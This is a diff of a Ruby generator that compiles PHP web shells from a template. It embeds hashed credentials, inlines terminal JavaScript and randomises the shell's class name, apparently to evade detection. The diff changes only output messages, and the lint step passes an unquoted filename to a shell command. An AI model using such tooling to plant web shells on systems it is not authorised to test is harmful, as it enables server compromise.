@@ -4,11 +4,14 @@ require 'getoptlong'
 require 'digest/sha1'
 require 'open-uri'
 #
-def usage
+def header
 	puts "PHP-Shell Generator"
 	puts "http://www.cixtor.com/phpshell"
 	puts "https://github.com/cixtor/phpshellgen"
 	puts
+end
+def usage
+	header
 	puts "Options:"
 	puts "  -h | --help     = Print this message with the list of available options."
 	puts "  -i | --input    = Specify the shell template to use in compilation."
@@ -83,40 +86,40 @@ rescue GetoptLong::InvalidOption => e
 end
 #
 if config[:input] and config[:output] then
-	puts "\e[0;93mCompiling...\e[0m"
+	header
 	class_name_length = rand(10)+5
 	allowed_chars = ('a'..'z').to_a + ('A'..'Z').to_a
 	config[:username_hash] = Digest::SHA1.hexdigest(config[:username])
 	config[:password_hash] = Digest::SHA1.hexdigest(config[:password])
 	config[:class_name] = Array.new(class_name_length, '').collect{ allowed_chars[rand(allowed_chars.size)] }.join('')
 	#
-	puts "Compiling shell into file: '\e[0;94m#{config[:output]}\e[0m'"
-	puts "Randomizing Shell class name: \e[0;93m#{config[:class_name]}\e[0m"
+	puts "\e[0;92mOK.\e[0m Compiling shell into file: '\e[0;94m#{config[:output]}\e[0m'"
+	puts "    Randomizing Shell class name: \e[0;93m#{config[:class_name]}\e[0m"
 	output = File.new(config[:output],'w')
 	template = File.open(config[:input],'r')
 	#
 	template.each_line do |line|
 		line = line.chomp
 		if line.match(/'username'=>'([a-z0-9]{40})',/) then
-			puts "Hashing username: \e[0;93m#{config[:username]}\e[0m"
+			puts "    Hashing username: \e[0;93m#{config[:username]}\e[0m"
 			output.write("'username'=>'#{config[:username_hash]}',")
 		elsif line.match(/'password'=>'([a-z0-9]{40})',/) then
-			puts "Hashing password: \e[0;93m#{config[:password]}\e[0m"
+			puts "    Hashing password: \e[0;93m#{config[:password]}\e[0m"
 			output.write("'password'=>'#{config[:password_hash]}',")
 		elsif line.match(/'interpreter'=>'(.*)',/)
-			puts "Settings default interpreter: \e[0;93m#{config[:shell]}\e[0m"
+			puts "    Settings default interpreter: \e[0;93m#{config[:shell]}\e[0m"
 			output.write("'interpreter'=>'#{config[:shell]}',")
 		elsif match = line.match(/(class Shell\{)/) or match = line.match(/(new Shell\(\))/) then
 			output.write(match[1].gsub('Shell', config[:class_name]))
 		elsif line.match(/<script type="text\/javascript" src="jquery.min.js"><\/script>/) then
-			puts "Adding jQuery support."
+			puts "    Adding jQuery support."
 			output.write("<script type='text/javascript'>")
 			output.write(get_jquery)
 			output.write("</script>")
 		elsif line.match(/^<\?php$/) then
 			output.write("<?php ")
 		elsif line.match(/<script type="text\/javascript" src="jquery.terminal.min.js"><\/script>/) then
-			puts "Adding jQuery.Terminal support."
+			puts "    Adding jQuery.Terminal support."
 			output.write("<script type='text/javascript'>")
 			output.write(get_jquery_terminal)
 			output.write("</script>")
@@ -126,7 +129,7 @@ if config[:input] and config[:output] then
 		end
 	end
 	%x{php -l #{config[:output]}} if config[:lint]==true
-	puts "\e[0;92mFinished.\e[0m"
+	puts "\e[0;92mOK.\e[0m Finished"
 	output.close
 else
 	usage
